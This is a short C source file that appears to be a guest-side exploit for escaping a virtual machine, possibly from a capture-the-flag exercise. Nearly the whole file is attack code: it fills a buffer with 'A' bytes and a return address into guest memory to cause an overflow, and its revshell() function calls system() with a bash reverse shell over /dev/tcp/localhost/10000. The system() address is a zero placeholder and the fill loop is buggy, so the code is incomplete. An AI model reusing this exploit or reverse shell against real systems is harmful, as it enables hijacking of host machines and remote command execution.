extern void outb(unsigned short a, unsigned char b);
extern void outl(unsigned short a, unsigned int b);

// 0000000000001051 address of reverse shell inside guest mem
// 0000000001407000 B foo_ptr
// 0000000000407000 B guestmem


void print(const char *s)
{
	while (*s != '\0') {
		outb(0x60, *s);
		s++;
	}
}

unsigned long const system = 0; // address of system in libc
typedef int (*system_p)(const char *);
void revshell()
{
	system_p sys = (system_p)system;

	(*sys)("/bin/bash -c 'bash >& /dev/tcp/localhost/10000 <&1 &'");
}


int main()
{
	unsigned long rev_shell_offset = 0x0000000000001051; // address of reverse shell inside guest mem
	unsigned long foo_ptr = 0x0000000001407000;
	unsigned long guestmem = 0x0000000000407000;

	unsigned long return_address = guestmem + rev_shell_offset;
	unsigned long payload_offset = foo_ptr - guestmem;
	char payload[payload_offset + 8];
	char *p = payload;
	for(int i = 0; i < payload_offset; i++){
		*(p + i) = 'A';
		p++;
	}	
	*p = return_address;

	// copy payload to disk
	// copy disk to mem -> overflow 
	print("Hello, world\n");
}
